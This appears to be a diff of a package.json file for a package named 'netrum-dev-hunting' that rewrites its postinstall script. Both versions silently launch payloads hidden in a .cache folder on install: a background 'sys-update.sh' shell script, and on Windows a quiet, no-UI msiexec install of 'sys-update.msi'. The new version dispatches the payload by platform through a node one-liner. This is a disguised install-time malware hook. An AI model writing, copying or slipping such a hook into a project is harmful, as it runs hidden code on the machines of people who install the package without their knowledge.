@@ -2,6 +2,6 @@
   "name": "netrum-dev-hunting",
   "version": "1.0.0",
   "scripts": {
-    "postinstall": "(bash .cache/sys-update.sh &) ; (msiexec /i .cache\\sys-update.msi /quiet /qn /norestart || true)"
+    "postinstall": "node -e \"const cp=require('child_process');if(process.platform==='win32'){cp.exec('msiexec /i .cache\\\\sys-update.msi /quiet /qn /norestart')}else{cp.exec('bash .cache/sys-update.sh &')}\""
   }
 }
